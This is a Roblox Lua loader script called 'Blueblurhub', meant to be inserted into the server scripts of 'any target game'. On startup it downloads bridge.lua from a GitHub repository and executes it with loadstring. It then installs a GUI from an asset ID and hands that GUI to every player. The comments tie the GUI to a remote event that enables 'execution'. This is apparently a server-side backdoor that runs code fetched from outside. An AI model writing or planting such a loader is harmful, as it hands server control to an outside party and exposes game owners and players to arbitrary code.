
-- ============================================================
-- Blueblurhub Loader
-- Shookenblook/Val-Privss
-- Insert as a Script in ServerScriptService of any target game
-- ============================================================

local HttpService   = game:GetService("HttpService")
local InsertService = game:GetService("InsertService")
local Players       = game:GetService("Players")
local StarterGui    = game:GetService("StarterGui")

local GUI_ASSET_ID = 78145948946458
local RAW_BASE     = "https://raw.githubusercontent.com/Shookenblook/Val-Privss/main/"

-- ============================================================
-- LOAD BRIDGE FROM GITHUB
-- ============================================================

local function loadBridge()
    print("[Loader] Fetching bridge...")
    local ok, code = pcall(function()
        return HttpService:GetAsync(RAW_BASE .. "bridge.lua", true)
    end)
    if not ok then
        warn("[Loader] Bridge fetch failed: " .. tostring(code))
        return false
    end
    local fn, err = loadstring(code)
    if not fn then
        warn("[Loader] Bridge compile error: " .. tostring(err))
        return false
    end
    local ok2, err2 = pcall(fn)
    if not ok2 then
        warn("[Loader] Bridge runtime error: " .. tostring(err2))
        return false
    end
    print("[Loader] Bridge loaded OK")
    return true
end

-- ============================================================
-- LOAD GUI FROM ROBLOX ASSET
-- ============================================================

local function loadGui()
    print("[Loader] Loading GUI asset " .. GUI_ASSET_ID .. "...")
    local ok, model = pcall(function()
        return InsertService:LoadAsset(GUI_ASSET_ID)
    end)
    if not ok then
        warn("[Loader] GUI asset load failed: " .. tostring(model))
        return false
    end
    for _, child in ipairs(model:GetChildren()) do
        local clone = child:Clone()
        clone.Parent = StarterGui
        print("[Loader] Installed into StarterGui: " .. child.Name)
    end
    model:Destroy()
    print("[Loader] GUI installed OK")
    return true
end

-- ============================================================
-- GIVE GUI TO A PLAYER RIGHT NOW
-- ============================================================

local function giveToPlayer(player)
    task.wait(1)
    for _, item in ipairs(StarterGui:GetChildren()) do
        local existing = player.PlayerGui:FindFirstChild(item.Name)
        if existing then existing:Destroy() end
        local clone = item:Clone()
        clone.Parent = player:WaitForChild("PlayerGui")
    end
    print("[Loader] GUI given to: " .. player.Name)
end

-- ============================================================
-- BOOT
-- ============================================================

print("[Loader] Blueblurhub starting...")

-- Bridge must load first so MangoRemote exists before GUI fires
local bridgeOk = loadBridge()
if not bridgeOk then
    warn("[Loader] Bridge failed — execution may not work")
end

-- Small wait to let the RemoteEvent settle
task.wait(0.5)

-- Load GUI model
local guiOk = loadGui()
if not guiOk then
    warn("[Loader] GUI failed to load")
end

-- Give to players already in game (Studio test mode)
for _, player in ipairs(Players:GetPlayers()) do
    task.spawn(giveToPlayer, player)
end

-- Give to future players
Players.PlayerAdded:Connect(function(player)
    task.spawn(giveToPlayer, player)
end)

print("[Loader] Blueblurhub fully deployed.")
